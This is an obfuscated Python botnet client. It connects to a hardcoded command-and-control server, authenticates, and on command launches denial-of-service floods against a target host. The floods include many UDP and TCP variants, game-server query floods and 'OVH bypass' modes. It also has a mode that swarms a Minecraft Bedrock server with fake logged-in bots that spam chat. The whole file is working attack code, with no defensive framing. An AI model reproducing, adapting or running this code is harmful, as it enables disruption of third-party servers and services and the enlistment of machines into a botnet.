Al='HANDSHAKING'
Ak='intervalo'
Aj='Standard_Custom'
Ai='replace'
Ah=b'\x00\x00'
Ag=isinstance
AO='register_sent'
AN='entity_id'
AM='split_id'
AL='order_index'
AK='msg_index'
AJ='send_seq'
AI=b'\x00'
AH=bytearray
A9='CONNECTING_1'
A8='mtu_idx'
A7='spawn_fallback'
A6='resource_pack_done'
A5='mensajes'
A4='yaw'
A3='chunk'
A2='text'
A1='move'
A0='nombre'
z=b''
u='ack_queue'
t='register_cmd'
s='z'
r='y'
q='x'
p='mtu_size'
o='port'
n='host'
m='.'
l=Exception
h='use_variant_a'
g='sent_frames'
e='req2_retry_t'
d='split_map'
c='spawned'
b='client_id'
Y=''
W=print
U='mtu_retry_t'
T='proto'
S=bytes
R='pos'
Q='utf-8'
P='sock'
N='phase'
L=False
K=range
J=int
H=None
F=True
E='is_closing'
D=len
import subprocess as AP,random as B,os,time as C,threading as O,socket as A,sys,struct as M,zlib as v,json,base64 as i,math,string as AQ,signal,hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization as AR,hashes
from cryptography.hazmat.backends import default_backend as Am
AS='45.13.236.245'
AT=26110
AU=5
f={}
Z=[]
AA=O.Lock()
G=L
An=b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
Ao=b'\xff\xff\xff\xffTSource Engine Query\x00'
Ap=b'atom data ontop my own ass amp/triphent is my dick and balls'
Aq=b'UUUU\x00\x00\x00\x01'
BU=AI*1024
Ar=[1024,2048]
def As():
	try:A=AP.check_output(['uname','-m'],stderr=AP.DEVNULL);return A.decode().strip()
	except:return'unknown'
def BV(length=4,chara='\n\r'):return Y.join(B.choice(chara)for A in K(length))
def At(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);B.connect((ip,port))
		while C.time()<secs:
			if stop_event.is_set():break
			for D in K(50):
				try:B.send(z)
				except:pass
		B.close()
	except:pass
def BW(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice(Ar))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def AB(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice([512,1024,2048]))
			for F in K(5):
				try:D.sendto(E,(ip,port))
				except:pass
	except:pass
def Au(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			for G in K(B.randint(5,20)):
				E=B.randint(8,1500);F=B._urandom(E)
				try:D.sendto(F,(ip,port))
				except:pass
			C.sleep(.001)
	except:pass
def Av(ip,port,secs,stop_event):
	try:
		E=[]
		for F in K(10):
			try:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E.append(D)
			except:pass
		while C.time()<secs:
			if stop_event.is_set():break
			for D in E:
				try:
					for F in K(50):G=B._urandom(1400);D.sendto(G,(ip,port))
				except:pass
		for D in E:
			try:D.close()
			except:pass
	except:pass
def Aw(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice([512,780,1024,1032]))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def Ax(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(D,(ip,port))
			except:pass
	except:pass
def Ay(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01'+AI*23+Ah
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(D,(ip,port))
			except:pass
	except:pass
def Az(ip,port,secs,stop_event):
	E=stop_event;F=secs
	while C.time()<F:
		if E.is_set():break
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(2);D.connect((ip,port))
			for G in K(100):
				if E.is_set()or C.time()>=F:break
				try:D.send(B._urandom(1400))
				except:break
			D.close()
		except:pass
def AV(ip,port,secs,stop_event):
	E=stop_event;F=secs
	while C.time()<F:
		if E.is_set():break
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(3);D.connect((ip,port))
			for G in K(50):
				if E.is_set()or C.time()>=F:break
				try:D.send(B._urandom(65000)[:1400])
				except:break
			D.close()
		except:pass
def A_(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.randint(90,120))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def B0(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[AI,b'\x01',b'\xff',b'\x16',b'\x13',b'\x03',b'G',b'P',b'H',b'O',Ah,b'\x01\x00',b'\xff\xff',b'\x80\x00',B._urandom(1),B._urandom(2)]
		while C.time()<secs:
			if stop_event.is_set():break
			for G in K(100):
				F=B.choice(E)
				try:D.sendto(F,(ip,port))
				except:pass
			C.sleep(.001)
		D.close()
	except:pass
def B1(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Aq,(ip,port))
			except:pass
	except:pass
def B2(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[b'\xde\xad\xbe\xef\xc0\xff\xee\x00',b'\xba\xad\xf0\r\r\x15\xea^',b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',b'\xde\xad\xc0\xde\xf0\r\xba\xbe',b'\x00\x11"3DUfw',b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',b'\x01#Eg\x89\xab\xcd\xef',b'\xfe\xdc\xba\x98vT2\x10']
		while C.time()<secs:
			if stop_event.is_set():break
			F=B.choice(E)*B.randint(10,100)
			try:D.sendto(F,(ip,port))
			except:pass
	except:pass
def B3(ip,port,secs,stop_event):
	D=secs
	while C.time()<D:
		if stop_event.is_set():break
		try:B=A.socket(A.AF_INET,A.SOCK_STREAM);B.settimeout(1);B.connect((ip,port));B.send(os.urandom(1024));B.close()
		except:pass
def B4(ip,port,secs,stop_event):
	E=secs
	while C.time()<E:
		if stop_event.is_set():break
		try:
			if B.choice([F,L]):D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(2);D.connect((ip,port));D.send(B._urandom(1024));D.close()
			else:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.sendto(B._urandom(1024),(ip,port));D.close()
		except:pass
def B5(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Ap,(ip,port))
			except:pass
	except:pass
def B6(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(An,(ip,port))
			except:pass
	except:pass
def B7(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Ao,(ip,port))
			except:pass
	except:pass
def B8(method,ip,port,secs,stop_event):
	A=method;B={'.HEX':B1,'.STDHEX':B2,'.UDP':AB,'.UDPFRAG':Au,'.UDPGAME':Aw,'.UDPPPS':At,'.UDPQUERY':Ax,'.UDPBYPASS':AB,'.UDPBYPASSV2':AB,'.UDPKILL':Av,'.TCP':Az,'.TCPOVH':AV,'.MIX':B4,'.SYN':B3,'.VSE':B7,'.MCPE':B5,'.FIVEM':B6,'.RAKNET':Ay,'.OVHUDP':A_,'.OVHTCP':AV,'.OVHPPS':B0}
	if A in B:B[A](ip,port,secs,stop_event)
def B9(method,ip,port,duration,thread_count,username):
	A=username;B=O.Event();E=C.time()+duration
	for G in K(thread_count):
		D=O.Thread(target=B8,args=(method,ip,port,E,B),daemon=F);D.start()
		if A not in f:f[A]=[]
		f[A].append((D,B))
def BA(username):
	A=username
	if A in f:
		for(C,B)in f[A]:B.set()
		f[A].clear()
AW=AQ.ascii_lowercase+AQ.digits
BB=S([0,255,255,0,254,254,254,254,253,253,253,253,18,52,86,120])
w=[1492,1464,1400,1200,576]
try:j=ec.generate_private_key(ec.SECP384R1(),Am())
except l:j=H
def AX():
	if j is H:return'AAAA'
	return i.b64encode(j.public_key().public_bytes(AR.Encoding.DER,AR.PublicFormat.SubjectPublicKeyInfo)).decode(Q)
def AY(data):
	A=data
	if Ag(A,(dict,list)):A=json.dumps(A,separators=(',',':')).encode(Q)
	elif Ag(A,str):A=A.encode(Q)
	return i.urlsafe_b64encode(A).rstrip(b'=').decode(Q)
def BC(der):B=der;A=2;F=B[A+1];A+=2;C=B[A:A+F];A+=F;K=B[A+1];A+=2;E=B[A:A+K];G=AH(48);H=AH(48);I=C[1:]if C[0]==0 else C;J=E[1:]if E[0]==0 else E;G[48-D(I):]=I;H[48-D(J):]=J;return S(G)+S(H)
def AZ(payload):
	B=AX();A=AY({'alg':'ES384','x5u':B})+m+AY(payload)
	if j is H:return A+m
	try:C=j.sign(A.encode(Q),ec.ECDSA(hashes.SHA384()));return A+m+i.urlsafe_b64encode(BC(C)).rstrip(b'=').decode(Q)
	except l:return A+m
class I:
	def __init__(A):A.parts=[]
	def u8(A,v):A.parts.append(M.pack('B',v&255));return A
	def u16be(A,v):A.parts.append(M.pack('>H',v&65535));return A
	def i32be(A,v):A.parts.append(M.pack('>i',v));return A
	def u32be(A,v):A.parts.append(M.pack('>I',v&4294967295));return A
	def i32le(A,v):A.parts.append(M.pack('<i',v));return A
	def i64be(A,v):A.parts.append(M.pack('>q',v));return A
	def u64be(A,v):A.parts.append(M.pack('>Q',v&0xffffffffffffffff));return A
	def f32be(A,v):A.parts.append(M.pack('>f',v));return A
	def t_le(A,v):A.parts.append(S([v&255,v>>8&255,v>>16&255]));return A
	def raw(A,b):A.parts.append(S(b));return A
	def magic(A):A.parts.append(BB);return A
	def str_(A,s):B=s.encode(Q);A.u16be(D(B));A.parts.append(B);return A
	def str_raw(A,b):b=S(b);A.u16be(D(b));A.parts.append(b);return A
	def rak_ip(A,ip,port):
		A.u8(4)
		for B in ip.split(m):A.u8(~J(B)&255)
		A.u16be(port);return A
	def buf(A):return z.join(A.parts)
class a:
	def __init__(A,b):A.b=S(b);A.p=0
	def left(A):return D(A.b)-A.p
	def u8(A):B=A.b[A.p];A.p+=1;return B
	def u16be(A):B=M.unpack_from('>H',A.b,A.p)[0];A.p+=2;return B
	def i32be(A):B=M.unpack_from('>i',A.b,A.p)[0];A.p+=4;return B
	def u32be(A):B=M.unpack_from('>I',A.b,A.p)[0];A.p+=4;return B
	def i64be(A):B=M.unpack_from('>q',A.b,A.p)[0];A.p+=8;return B
	def u64be(A):B=M.unpack_from('>Q',A.b,A.p)[0];A.p+=8;return B
	def f32be(A):B=M.unpack_from('>f',A.b,A.p)[0];A.p+=4;return B
	def t_le(A):B=A.b[A.p]|A.b[A.p+1]<<8|A.b[A.p+2]<<16;A.p+=3;return B
	def bytes_(A,n):B=A.b[A.p:A.p+n];A.p+=n;return B
	def skip(A,n):A.p+=n;return A
	def str_(A):B=A.u16be();return A.bytes_(B).decode(Q,errors=Ai)
def BD(base):return f"{base}_{Y.join(B.choices(AW,k=6))}"
def BE():return Y.join(B.choices(AW,k=8))
def BF():
	D=AH(8192)
	def A(x0,y0,x1,y1,r,g,b,a=255):
		for B in K(y0,y1):
			for C in K(x0,x1):A=(B*64+C)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=a
	def E(x,y,r,g,b):A=(y*64+x)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=255
	B=198,134,66;G=92,56,35;C=67,95,175;F=53,85,105;H=38,38,38;A(8,0,16,8,*G);A(16,0,24,8,*B);A(0,8,8,16,*B);A(8,8,16,16,*B);A(16,8,24,16,*G);A(24,8,32,16,*G);A(8,0,16,4,*G);A(9,9,11,11,255,255,255);E(9,10,33,18,7);A(13,9,15,11,255,255,255);E(14,10,33,18,7);E(11,11,*B);E(12,11,*B);E(11,12,140,80,30);E(12,12,140,80,30);A(10,13,14,14,140,60,20);A(20,16,28,20,*C);A(28,16,36,20,*C);A(16,20,20,32,*C);A(20,20,28,32,*C);A(28,20,32,32,*C);A(32,20,40,32,*C);A(23,20,25,32,50,75,155);A(44,16,48,20,*B);A(48,16,52,20,*B);A(40,20,44,32,*B);A(44,20,48,32,*B);A(48,20,52,32,*B);A(52,20,56,32,*B);A(44,20,48,24,*C);A(40,20,44,24,*C);A(48,20,52,24,*C);A(52,20,56,24,*C);A(4,16,8,20,*F);A(8,16,12,20,*F);A(0,20,4,32,*F);A(4,20,8,32,*F);A(8,20,12,32,*F);A(12,20,16,32,*F);A(0,28,4,32,*H);A(4,28,8,32,*H);A(8,28,12,32,*H);A(12,28,16,32,*H);return i.b64encode(S(D)).decode(Q)
Aa=BF()
def BG(bot):A=bot;H=AX();K='00000000-0000-4000-8000-'+os.urandom(6).hex();B=J(C.time());L=AZ({'extraData':{'displayName':A[A0],'identity':K,'XUID':Y},'identityPublicKey':H,'nbf':B-60,'exp':B+86400});M=AZ({'ClientRandomId':A[b]&4294967295,'ServerAddress':f"{A[n]}:{A[o]}",'SkinData':Aa,'SkinId':Aj,'CapeData':Y,'SkinGeometryName':'geometry.humanoid.custom','SkinGeometry':Y,'DeviceOS':1,'GameVersion':'0.15.10'});E=json.dumps({'chain':[L]}).encode(Q);F=M.encode(Q);N=I().i32le(D(E)).raw(E).i32le(D(F)).raw(F).buf();G=v.compress(N,level=7);return S([254,1])+I().i32be(84).i32be(D(G)).raw(G).buf()
def BH(bot):A=bot;B=i.b64decode(Aa);return I().u8(143).str_(A[A0]).i32be(70).i32be(70).u64be(A[b]).raw(os.urandom(16)).str_(f"{A[n]}:{A[o]}").str_(Y).str_(Aj).str_raw(B).u8(0).buf()
def BI(pkts,bot):
	B=z.join(M.pack('>I',D(A))+A for A in pkts);A=v.compress(B,level=7)
	if bot[T]>=84:return S([254,6])+I().i32be(D(A)).raw(A).buf()
	return I().u8(146).i32be(D(A)).raw(A).buf()
BJ=1024
def X(bot,buf):
	A=bot
	if A[P]is H:return
	try:A[P].sendto(buf,(A[n],A[o]))
	except:pass
def k(bot,payload,is_split,split_count,split_id,split_idx):
	F=is_split;C=payload;A=bot
	if A[P]is H or A[E]or G:return
	J=A[AJ];A[AJ]+=1;B=I().u8(132).t_le(J);B.u8(112 if F else 96);B.u16be(D(C)*8);L=A[AK];A[AK]+=1;M=A[AL];A[AL]+=1;B.t_le(L).t_le(M).u8(0)
	if F:B.u32be(split_count).u16be(split_id).u32be(split_idx)
	B.raw(C);K=B.buf();A[g][J]=K
	if D(A[g])>BJ:del A[g][next(iter(A[g]))]
	X(A,K)
def Ab(bot,payload):
	B=payload;A=bot
	if A[P]is H or A[E]or G:return
	C=(A[p]or 1464)-60
	if D(B)<=C:k(A,B,L,0,0,0);return
	M=A[AM]&65535;A[AM]+=1;J=math.ceil(D(B)/C)
	for I in K(J):k(A,B[I*C:(I+1)*C],F,J,M,I)
def V(bot,pkt):
	A=bot
	if A[P]is H or A[E]or G:return
	Ab(A,BI([pkt],A))
def AC(bot):
	if bot[T]<84:return{A1:157,A2:147,A3:201}
	if bot[h]:return{A1:16,A2:7,A3:61}
	return{A1:19,A2:9,A3:69}
def x(bot):return I().u8(AC(bot)[A3]).i32be(8).buf()
def BK(bot):B=bot;A=B[R];return I().u8(AC(B)[A1]).i64be(B[AN]).f32be(A[q]).f32be(A[r]).f32be(A[s]).f32be(A[A4]).f32be(A[A4]).f32be(A['pitch']).u8(0).u8(1).buf()
def Ac(bot,msg):return I().u8(AC(bot)[A2]).u8(1).str_(bot[A0]).str_(msg).buf()
def Ad(bot,status):A=8 if bot[h]else 8;return I().u8(A).u8(status).u16be(0).buf()
def Ae(bot,status):
	A=bot
	if status==3 and not A[c]:A[c]=F;V(A,x(A));BL(A);BN(A);BM(A)
def BL(bot):
	A=bot
	if A[AO]or not A[t]:return
	A[AO]=F
	if A[t].startswith('/'):B=f"{A[t]} {BE()}"
	else:B=A[t]
	V(A,Ac(A,B))
def BM(bot):
	A=bot
	def B():
		B=0
		while not A[E]and not G and A[c]:
			if A[A5]:F=A[A5][B%D(A[A5])];V(A,Ac(A,F));B+=1
			C.sleep(A[Ak])
	O.Thread(target=B,daemon=F).start()
def BN(bot):
	A=bot
	def D():
		D,F,H=A[R][q],A[R][r],A[R][s]
		while not A[E]and not G and A[c]:A[R][q]=D+B.uniform(-5,5);A[R][s]=H+B.uniform(-5,5);A[R][r]=F+B.uniform(-.5,.5);A[R][A4]=B.uniform(0,360);V(A,BK(A));C.sleep(.5)
	O.Thread(target=D,daemon=F).start()
def y(bot,data):
	J=data;A=bot
	if not J or A[E]:return
	C=J[0];B=a(J);B.skip(1)
	if C==144 or C==2:
		D=B.i32be()
		if D==0:V(A,x(A))
		elif D in(1,2):AF(A)
		elif D==3:Ae(A,D)
		return
	if C==6 and A[T]>=84 and not A[A6]and not A[h]:V(A,Ad(A,3));return
	if C==7 and A[T]>=84 and not A[A6]and not A[h]:A[A6]=F;V(A,Ad(A,4));return
	if C==3 and A[T]>=84:V(A,I().u8(4).buf());V(A,x(A));return
	if C in(149,9,11,17):
		if A[T]>=84:A[h]=C==9
		try:B.i32be();B.u8();B.i32be();B.i32be();A[AN]=B.i64be();B.i32be();B.i32be();B.i32be();A[R][q]=B.f32be();A[R][r]=B.f32be();A[R][s]=B.f32be()
		except:pass
		V(A,x(A))
		if A[A7]is H:
			def L():
				if not A[c]and not A[E]and not G:Ae(A,3)
			K=O.Timer(1e1,L);K.daemon=F;K.start();A[A7]=K
		return
	if C in(145,5):AF(A);return
def AD(bot,payload):
	C=bot
	if C[E]:return
	try:
		F=a(payload);J=F.i32be();H=F.bytes_(min(J,F.left()))
		try:I=v.decompress(H)
		except:I=v.decompress(H,-15)
		A=a(I)
		while A.left()>=4:
			G=A.u32be()
			if G==0 or G>A.left():break
			B=A.bytes_(G)
			if B[0]==254 and D(B)>1:y(C,B[1:])
			else:y(C,B)
	except:pass
def Af(bot,payload):
	B=bot;A=payload
	if not A or B[E]:return
	F=A[0]
	if F==0:
		if D(A)>=9:G=M.unpack_from('>q',A,1)[0];k(B,I().u8(3).i64be(G).i64be(J(C.time()*1000)).buf(),L,0,0,0)
		return
	if F==21:AF(B);return
	if F==16:BP(B,A);return
	if F==254:
		if D(A)<2:return
		if A[1]==6:AD(B,A[2:])
		else:y(B,A[1:])
		return
	if F==146:AD(B,A[1:]);return
	if F==6 and B[T]>=84:AD(B,A[1:]);return
	y(B,A)
def BO(bot,msg):
	B=bot
	if B[E]:return
	A=a(msg);A.skip(1);L=A.t_le();B[u].append(L)
	while A.left()>0:
		try:
			D=A.u8();F=D>>5&7;G=D>>4&1;M=A.u16be();N=math.ceil(M/8)
			if F in(2,3,4,6,7):A.t_le()
			if F in(1,3,4):A.t_le();A.u8()
			I=C=J=0
			if G:I=A.u32be();C=A.u16be();J=A.u32be()
			K=A.bytes_(N)
			if G:
				if C not in B[d]:B[d][C]=[H]*I
				B[d][C][J]=K
				if all(A is not H for A in B[d][C]):Af(B,z.join(B[d][C]));del B[d][C]
			else:Af(B,K)
		except:break
def BP(bot,payload):
	A=bot
	if A[E]:return
	B=a(payload);B.skip(1);F=0
	try:
		H=B.u8();B.skip(6 if H==4 else 18);B.skip(2)
		for M in K(10):P=B.u8();B.skip(6 if P==4 else 18)
		F=B.i64be()
	except:pass
	D=I().u8(19).rak_ip(A[n],A[o])
	for M in K(10):D.u8(4).u8(128).u8(255).u8(255).u8(254).u16be(0)
	D.i64be(F).i64be(J(C.time()*1000));k(A,D.buf(),L,0,0,0)
	if A[N]==Al:
		A[N]='LOGIN'
		def Q():
			if G or A[E]:return
			Ab(A,BG(A)if A[T]>=84 else BH(A))
		O.Timer(.1,Q).start()
def AE(bot):
	A=bot
	if A[P]is H or A[E]or G:return
	B=w[A[A8]%D(w)];A[p]=B;C=max(0,B-28-1-16-1);X(A,I().u8(5).magic().u8(7).raw(S(C)).buf())
def AF(bot):
	A=bot
	if A[E]:return
	A[E]=F;A[c]=L
	for B in(A7,U,e):
		C=A.get(B)
		if C:C.cancel();A[B]=H
	D=A[P];A[P]=H
	if D:
		try:D.close()
		except:pass
def AG(bot):
	A=bot
	if A[U]:A[U].cancel()
	def C():
		if A[N]!=A9 or A[E]or G:return
		A[A8]=(A[A8]+1)%D(w);AE(A);AG(A)
	B=O.Timer(3.,C);B.daemon=F;B.start();A[U]=B
def BQ(host,port,nombre,register_cmd,mensajes,intervalo):
	i='UNCONNECTED';B={n:host,o:port,A0:BD(nombre),t:register_cmd,A5:mensajes,Ak:intervalo,b:J.from_bytes(os.urandom(8),'big'),p:w[0],AJ:0,AK:0,AL:0,AM:0,AN:0,R:{q:0,r:64,s:0,A4:0,'pitch':0},c:L,E:L,P:H,AO:L,N:i,A8:0,T:70,h:L,A6:L,u:[],d:{},g:{},A7:H,U:H,e:H};f=A.socket(A.AF_INET,A.SOCK_DGRAM);f.setblocking(L);f.bind((Y,0));B[P]=f;X(B,I().u8(1).i64be(J(C.time()*1000)).magic().u64be(B[b]).buf())
	def V():
		n='_req2flip';m='CONNECTING_2'
		while not B[E]and not G:
			try:A,v=f.recvfrom(65535)
			except BlockingIOError:C.sleep(.001);continue
			except:break
			if not A:continue
			W=A[0]
			if W==192:continue
			if W==160:
				try:
					Z=a(A);Z.skip(1);w=Z.u16be()
					for v in K(w):
						x=Z.u8();R=Z.t_le();V=R if x else Z.t_le()
						for y in K(R,V+1):
							o=B[g].get(y)
							if o and B[P]and not B[E]:X(B,o)
				except:pass
				continue
			if 128<=W<=143:
				BO(B,A)
				if B[u]and not B[E]:
					Y=sorted(set(B[u]));c=[];S=0
					while S<D(Y):
						R=V=Y[S]
						while S+1<D(Y)and Y[S+1]==Y[S]+1:S+=1;V=Y[S]
						c.append((R,V));S+=1
					d=I().u8(192).u16be(D(c))
					for(R,V)in c:d.u8(1).t_le(R)if R==V else d.u8(0).t_le(R).t_le(V)
					X(B,d.buf());B[u]=[]
				continue
			if W==6 and B[N]==A9:
				if D(A)>=2:q=M.unpack_from('>H',A,D(A)-2)[0];B[p]=q if 576<=q<=1500 else 1400
				B[N]=m
				if B[U]:B[U].cancel();B[U]=H
				r=I().u8(7).magic().rak_ip(host,port).u16be(B[p]).u64be(B[b]).buf();X(B,r);B[n]=L
				def s():
					if B[N]!=m or B[E]:return
					B[n]=not B[n];X(B,r);A=O.Timer(2.,s);A.daemon=F;A.start();B[e]=A
				h=O.Timer(2.,s);h.daemon=F;h.start();B[e]=h;continue
			if W==8 and B[N]==m:
				if B[e]:B[e].cancel();B[e]=H
				B[N]=Al;k(B,I().u8(9).u64be(B[b]).i64be(J(C.time()*1000)).u8(0).buf(),L,0,0,0);continue
			if W==28 and B[N]==i:
				try:
					j=a(A);j.skip(33);z=j.bytes_(j.u16be()).decode(Q,errors=Ai);l=z.split(';')
					if D(l)>=3 and l[2].isdigit():
						t=J(l[2])
						if t>0:B[T]=t
				except:pass
				if B[U]:B[U].cancel();B[U]=H
				B[N]=A9;AE(B);AG(B);continue
	O.Thread(target=V,daemon=F).start();S=[0]
	def W():
		while B[N]==i and not B[E]and not G:
			C.sleep(.5);S[0]+=1
			if S[0]>=4:
				if B[N]==i:B[T]=70;B[N]=A9;AE(B);AG(B)
				return
			X(B,I().u8(1).i64be(J(C.time()*1000)).magic().u64be(B[b]).buf())
	O.Thread(target=W,daemon=F).start();return B
def BR(host,port,nombre,cantidad,tiempo,register_cmd,mensajes_raw,intervalo):
	M=mensajes_raw;I=nombre;H=intervalo;B=cantidad;A=tiempo;global Z,G
	try:
		B=J(B);A=J(A);H=J(H);N=[A.strip().replace('-',' ')for A in M.split('|')if A.strip()]if M else['Hola!'];W(f"[MCBot] Iniciando ataque a {host}:{port}");W(f"[MCBot] Bots: {B}, Tiempo: {A}s, Nombre: {I}")
		for Q in K(B):
			if G:break
			D=BQ(host,port,I,register_cmd,N,H)
			with AA:Z.append(D)
			C.sleep(.3)
		if A>0:
			C.sleep(A);G=F
			with AA:
				for D in Z[:]:
					D[E]=F
					try:D[P].close()
					except:pass
				Z.clear()
			G=L
		return F
	except l as O:W(f"[MCBot] Error: {O}");return L
def BS():
	global Z,G;G=F
	with AA:
		for A in Z[:]:
			A[E]=F
			try:A[P].close()
			except:pass
		Z.clear()
def BT():
	P='MCBOT';global G
	while F:
		try:
			E=A.socket(A.AF_INET,A.SOCK_STREAM);E.setsockopt(A.SOL_SOCKET,A.SO_KEEPALIVE,1);E.settimeout(10);W(f"[*] Conectando a {AS}:{AT}...");E.connect((AS,AT));W('[+] Conectado!');H=0
			while H<2:
				try:
					I=E.recv(1024).decode()
					if'Username'in I:E.send(As().encode());H=1
					elif'Password'in I and H==1:E.send('ÿÿÿÿ='.encode('cp1252'));H=2
				except A.timeout:continue
				except:break
			if H<2:raise l('Auth failed')
			W('✅ Autenticado!')
			while F:
				try:
					I=E.recv(1024).decode().strip()
					if not I:continue
					B=I.split(' ');M=B[0].upper()
					if M=='PING':E.send('PONG'.encode())
					elif M=='STOP'and D(B)>1:
						K=B[1];BA(K)
						if K==P or P in K:BS();G=L
					elif M=='.MCBOT':
						if D(B)>=9:Q=B[1];N=J(B[2]);R=B[3];S=J(B[4]);T=J(B[5]);U=B[6];V=B[7];X=J(B[8]);G=L;O.Thread(target=BR,args=(Q,N,R,S,T,U,V,X),daemon=F).start()
					elif D(B)>=4:Y=M;Z=B[1];N=J(B[2]);a=J(B[3]);b=J(B[4])if D(B)>=5 else 1;K=B[5]if D(B)>=6 else'default';B9(Y,Z,N,a,b,K)
				except A.timeout:continue
				except:break
			E.close()
		except l as c:W(f"❌ Error: {c}")
		W(f"[*] Reintentando en {AU} segundos...");C.sleep(AU)
if __name__=='__main__':
	try:BT()
	except KeyboardInterrupt:W('\n🛑 Detenido');sys.exit(0)
	except:pass
